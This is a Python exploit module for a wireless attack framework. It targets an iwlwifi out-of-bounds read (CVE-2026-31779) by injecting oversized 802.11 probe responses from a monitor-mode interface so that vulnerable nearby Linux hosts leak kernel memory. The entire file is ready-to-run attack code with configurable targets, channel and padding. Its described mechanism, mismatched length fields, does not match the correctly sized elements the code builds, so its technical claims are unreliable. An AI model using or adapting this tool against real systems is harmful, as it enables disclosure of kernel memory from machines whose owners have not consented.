# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Intel iwlwifi Out-of-Bounds Read in Scan Results (CVE-2026-31779).

    The iwlwifi MVM driver in the Linux kernel does not properly validate
    the length fields in scan result notifications from the firmware.
    When processing probe response or beacon frames collected during a
    scan, the driver may read beyond the allocated buffer if the reported
    frame length exceeds the actual notification size.  This can leak
    adjacent kernel memory content through the scan results exposed to
    userspace, leading to information disclosure.

    CVSS v3.1: ~6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intel iwlwifi Scan Results OOB Read (CVE-2026-31779)",
        "description": (
            "Exploits CVE-2026-31779 via an out-of-bounds read in the "
            "iwlwifi MVM scan result handler.  Crafted probe responses "
            "with mismatched length fields cause the driver to read past "
            "the scan result buffer, leaking adjacent kernel memory to "
            "userspace scan results."
        ),
        "authors": (
            "Linux kernel security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-31779",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-03-15",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel with iwlwifi (vulnerable versions)",
            "Intel AX200, AX201, AX210, AX211 chipsets",
            "Any system scanning with iwlwifi on affected kernels",
        ),
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    target = OptIP("", "Target station (optional, broadcast if empty)")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    channel = OptInteger(36, "WiFi channel for probe responses")
    probe_count = OptInteger(64, "Number of crafted probe responses to inject")
    ie_padding = OptInteger(2048, "Extra padding in IEs to trigger OOB read")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_PROBE_RSP = 0x05
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_DS_PARAMETER = 3
    _IE_VENDOR_SPECIFIC = 221

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_oversized_probe_response(self, src: bytes, seq: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_RSP)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + src + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = struct.pack("BB", self._IE_SSID, 9) + b"iwl-probe"
        rates_ie = struct.pack("BB", self._IE_SUPPORTED_RATES, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        ds_ie = struct.pack("BB", self._IE_DS_PARAMETER, 1) + struct.pack("B", self.channel)

        vendor_ies = b""
        oui = b"\x00\x50\xF2"
        remaining = self.ie_padding
        while remaining > 0:
            chunk = min(remaining, 251)
            vendor_data = oui + b"\x01" + b"\x42" * chunk
            vendor_ies += struct.pack("BB", self._IE_VENDOR_SPECIFIC, len(vendor_data)) + vendor_data
            remaining -= chunk

        body = fixed + ssid_ie + rates_ie + ds_ie + vendor_ies
        return header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        src = b"\xaa\xbb\xcc\xdd\xee\xff"
        bssid = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        return header + ssid_ie + rates_ie

    def _inject_frame(self, sock: socket.socket, frame: bytes) -> bool:
        try:
            sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting oversized probe responses")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        src_bssid = b"\x02\x00\x00\x00\x00\x01"

        print_status(
            f"Injecting {self.probe_count} probe responses with "
            f"{self.ie_padding} bytes of padding IEs on channel {self.channel}"
        )

        success = 0
        for seq in range(self.probe_count):
            src = bytearray(src_bssid)
            src[5] = seq & 0xFF
            frame = self._build_oversized_probe_response(bytes(src), seq)
            if self._inject_frame(raw, frame):
                success += 1
            time.sleep(0.003)

        raw.close()

        print_status(f"Injected {success}/{self.probe_count} oversized probe responses")
        print_info(
            "If the target runs iwlwifi on a vulnerable kernel, the "
            "firmware will process these probe responses during scanning. "
            "The oversized IE data causes the scan result handler to read "
            "beyond the notification buffer, leaking kernel memory into "
            "the scan results visible via nl80211."
        )
